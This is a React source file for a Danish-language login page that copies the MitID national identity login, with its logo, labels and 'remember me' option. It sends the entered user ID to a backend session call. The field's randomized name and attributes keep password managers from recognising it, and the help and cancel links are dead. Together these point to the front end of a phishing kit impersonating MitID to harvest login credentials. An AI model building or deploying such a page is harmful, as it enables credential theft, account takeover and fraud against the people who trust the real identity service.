import { useState } from 'react'
import BrandLogo from '../components/BrandLogo'
import MitIdLogo from '../components/MitIdLogo'
import ArrowIcon from '../components/ArrowIcon'
import SidePanel from '../components/SidePanel'
import { api } from '../services/api'

interface Props {
  onSessionCreated: (sessionId: string, userId: string) => void
}

export default function LoginPage({ onSessionCreated }: Props) {
  const [userId, setUserId] = useState('')
  const [showUserId, setShowUserId] = useState(true)
  const [remember, setRemember] = useState(false)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!userId.trim()) return
    setLoading(true)
    setError('')
    try {
      const { sessionId } = await api.initSession(userId)
      onSessionCreated(sessionId, userId)
    } catch {
      setError('Forbindelsen mislykkedes. Prøv igen.')
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="min-h-screen flex flex-col" style={{ background: '#ffffff', fontFamily: '"IBM Plex Sans", Arial, Helvetica, FreeSans, sans-serif', lineHeight: '1.5rem', fontSize: '1rem', color: '#333' }}>
      <header className="hidden sm:flex bg-white h-[50px] items-center px-6 border-b border-gray-200">
        <BrandLogo />
      </header>
      <main className="flex-1 sm:mt-[26px] mt-0 sm:px-0 sm:flex sm:justify-center">
        <div className="flex flex-col lg:flex-row lg:gap-[60px] items-center lg:items-start">
          <div className="bg-white w-full lg:max-w-[400px] lg:mx-0" style={{ minHeight: '24.8rem', height: 588, border: '1px solid #e0e0e0', marginTop: 26 }}>
            <form onSubmit={handleSubmit} className="flex flex-col h-full px-5 sm:px-6 pt-8 pb-5">
              <div className="flex items-start justify-between mt-4">
                <h1 className="text-[18px] font-bold leading-[1.35] pr-4">Log på hos MitID.dk</h1>
                <MitIdLogo />
              </div>
              <hr style={{ borderTop: '1px solid #e0e0e0' }} className="mt-3 mb-4" />
              <div className="mb-4">
                <div className="flex items-center gap-1.5 mb-2">
                  <label className="text-[15px] font-bold uppercase">Bruger-ID</label>
                  <button type="button" className="w-4 h-4 flex items-center justify-center cursor-help" aria-label="Åbn hjælpetekst">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path fill="#001C44" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-4h2v2h-2zm1.61-9.96c-2.06-.3-3.88.97-4.43 2.79-.18.58.26 1.17.87 1.17h.2c.41 0 .74-.29.88-.67.32-.89 1.27-1.5 2.3-1.28.95.2 1.65 1.13 1.57 2.1-.1 1.34-1.62 1.63-2.45 2.88 0 .01-.01.01-.01.02-.01.02-.02.03-.03.05-.09.15-.18.32-.25.5-.01.03-.03.05-.04.08-.01.02-.01.04-.02.07-.12.34-.2.75-.2 1.25h2c0-.42.11-.77.28-1.07.02-.03.03-.06.05-.09.08-.14.18-.27.28-.39.01-.01.02-.03.03-.04.1-.12.21-.23.33-.34.96-.91 2.26-1.65 1.99-3.56-.24-1.74-1.61-3.21-3.35-3.47z"/></svg>
                  </button>
                </div>
                <div className="relative">
                  <input type={showUserId ? 'text' : 'password'} value={userId} onChange={(e) => setUserId(e.target.value)}
                    name={`uid_${Math.random().toString(36).slice(2)}`}
                    className="w-full border border-[#999] rounded-[2px] px-3 py-2.5 text-[15px] focus:outline-none focus:border-[#0055a5] focus:ring-1 focus:ring-[#0055a5] pr-14" autoComplete="off" inputMode="text" data-lpignore="true" data-1p-ignore="true" spellCheck={false} />
                  <div role="button" onClick={() => setShowUserId(!showUserId)} className="absolute right-3 top-1/2 -translate-y-1/2 text-[15px] font-bold text-gray-700 hover:text-gray-900 cursor-pointer select-none" tabIndex={0}>
                    {showUserId ? 'Skjul' : 'Vis'}
                  </div>
                </div>
              </div>
              {error && <div className="text-red-600 text-xs mb-2">{error}</div>}
              <button type="submit" disabled={loading || !userId.trim()}
                className={`w-full font-bold text-[16px] py-3 px-4 rounded-[3px] flex items-center justify-between transition-colors ${
                  userId.trim() && !loading
                    ? 'bg-[#0055a5] hover:bg-[#004080] text-white cursor-pointer'
                    : 'bg-[#d9d9d9] text-white cursor-not-allowed'
                }`}>
                <span className="uppercase">{loading ? 'Forbinder...' : 'Fortsæt'}</span><ArrowIcon />
              </button>
              <div className="mt-4 mb-1">
                <a href="#" className="inline-flex items-center gap-2 text-[#0055a5] hover:underline text-[15px] font-bold">
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M11 7h2v2h-2V7zm0 4h2v6h-2v-6zm1-9C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z" fill="#0055a5"/>
                  </svg>
                  <span>Glemt bruger-ID?</span>
                </a>
              </div>
              <div className="flex-1" />
              <label className="flex items-center gap-2.5 cursor-pointer mb-4">
                <input type="checkbox" checked={remember} onChange={(e) => setRemember(e.target.checked)} className="w-[16px] h-[16px] accent-[#0055a5] cursor-pointer shrink-0" />
                <span className="text-[15px] leading-snug font-bold">Husk mig hos <strong>MitID.dk</strong></span>
              </label>
              <hr style={{ borderTop: '1px solid #e0e0e0' }} className="mb-4" />
              <nav className="flex items-center gap-8 text-[15px] font-bold text-[#333]">
                <a href="#" className="hover:underline">Afbryd</a><a href="#" className="hover:underline">Hjælp</a>
              </nav>
            </form>
          </div>
          <div className="hidden lg:block"><SidePanel /></div>
        </div>
      </main>
    </div>
  )
}
